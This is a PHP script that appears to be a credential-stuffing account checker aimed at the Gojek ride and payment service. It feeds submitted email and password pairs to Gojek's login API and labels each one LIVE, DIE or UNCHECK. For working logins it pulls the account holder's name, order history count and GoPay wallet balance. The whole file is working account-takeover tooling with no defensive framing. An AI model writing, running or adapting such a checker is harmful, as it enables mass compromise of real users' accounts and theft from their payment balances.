<?php
/*
	1: NOTICE
	-1: UNCHECK
	2: DIE
	3: BAD/SOCKS DIE
	0: LIVE
*/
date_default_timezone_set("Asia/Jakarta");
// function
require_once 'includes/class_curl.php';

// info data
$empass = $_REQUEST['mailpass'];
if (!isset($empass)) {
	header('location: ./');
	exit;
}
$delim = $_REQUEST['delim'];
//$timeout = 10;
list($email,$pwd) = explode($delim, $empass);
$result = array();

// info curl
$cookie = "cookies/".md5($email.'|'.$pwd)."_gojek.txt";
/* $curl = new curl();
$curl->cookies($cookie);
if ($sock) $curl->socks($sock);
$curl->ssl(0,2); */

$page = curl("https://api.gojek.co.id/gojek/oauth/token?client_id=consumer-trusted-client&grant_type=password&username={$email}&password={$pwd}","",$cookie);
if (in_string($page,"Email and password don't match")) {
  $result["error"] = 2;
  $result["msg"] = '<b style="color:red">DIE</b> | '.$email.' | '.$pwd;
} else if (in_string($page,"access_token")) {
  $token = fetch_value($page,'"access_token":"','"');
  $refresh_token = fetch_value($page,'"refresh_token":"','"');
  $activitySource = fetch_value($page,'"expires_in":',',');
  // nama & customerId
  $page = curl("https://api.gojek.co.id/gojek/customer/login","userName={$email}&password={$pwd}&deviceToken={$refresh_token}&activitySource={$activitySource}",$cookie);
  $info["name"] = 'Name: '.fetch_value($page,'"name":"','"');
  $customerId = fetch_value($page,'"customerId":',',');
  // order
  $page = curl("https://api.gojek.co.id/gojek/booking/history/".$customerId,"",$cookie);
  preg_match_all("/\"orderNo\":\"(.*?)\",\"serviceType/i",$page,$order);
  $info["total_order"] = (count($order[1]) == 0) ? 'No Order' : 'Total Order: '.count($order[1]);
  // GoPay
  $page = curl("https://api.gojek.co.id/gojek/v2/customer/currentBalance/{$customerId}?access_token={$token}");
  $saldo = 'Saldo: Rp.'.str_replace('.00','',fetch_value($page,'"currentBalance":',','));
  $result["error"] = 0;
  $live = '<b style="color:green">LIVE</b> | '.$email.' | '.$pwd.' | '.implode(" | ",$info).' | <span style="color:orange">'.$saldo.'</span> | Checked at '.date("d/m/Y g:i A").' #TC-ID Tools';
  $result["msg"] = $live;
} else {
  $result["error"] = -1;
  $result["msg"] = '<b style="color:gold">UNCHECK</b> | '.$email.' | '.$pwd;
}

echo json_encode($result);
@unlink($cookie);

//$curl->close(); // tutup curl
?>